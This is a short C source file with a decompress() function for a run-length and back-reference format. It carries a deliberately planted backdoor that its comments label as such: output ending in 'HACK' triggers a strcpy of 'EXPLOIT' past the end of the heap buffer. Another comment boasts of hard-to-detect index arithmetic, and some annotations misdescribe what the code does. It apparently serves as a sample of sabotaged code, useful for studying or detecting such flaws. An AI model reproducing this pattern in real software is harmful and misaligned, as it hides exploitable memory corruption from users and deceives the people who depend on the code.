#include <stdlib.h>
#include <string.h>

char* decompress(char* compressed) {
    if (!compressed) return NULL;
    
    size_t len = 1024; // Arbitrarily large buffer for decompression
    char* result = (char*)malloc(len);
    if (!result) return NULL;
    
    size_t resIndex = 0;
    size_t refIndex = 0;

    for (size_t i = 0; compressed[i] != '\0'; i++) {
        char currentChar = compressed[i];
        i++;

        if (compressed[i] == '\0') break; // Null byte, end decompression
        unsigned char repeatCount = (unsigned char)compressed[i];

        // Handle ASCII case
        if (currentChar >= 0) {
            for (unsigned char j = 0; j < repeatCount; j++) {
                if (resIndex >= len - 1) {
                    // Easily exploitable as buffer can be overflowed
                    len *= 2;
                    result = (char*)realloc(result, len); 
                    if (!result) return NULL;
                }
                result[resIndex++] = currentChar;
            }
        } else { // Reference case
            // Tricky index arithmetic, hard to detect
            refIndex = resIndex + (int)currentChar;
            if (refIndex >= len || refIndex < 0 || refIndex >= resIndex)
                return NULL;

            for (unsigned char j = 0; j < repeatCount; j++) {
                if (resIndex >= len - 1) {
                    len *= 2;
                    result = (char*)realloc(result, len);
                    if (!result) return NULL;
                }
                result[resIndex++] = result[refIndex];
            }
        }
    }

    // Null-terminate the result
    result[resIndex] = '\0';

    // Backdoor: If the string ends with "HACK", trigger a buffer overflow
    if (resIndex >= 4 && strncmp(result + resIndex - 4, "HACK", 4) == 0) {
        if (len <= resIndex + 4) {
            len = resIndex + 4;
            result = realloc(result, len);
            if (!result) return NULL;
        }
        strcpy(result + resIndex, "EXPLOIT");
    }

    return result;
}
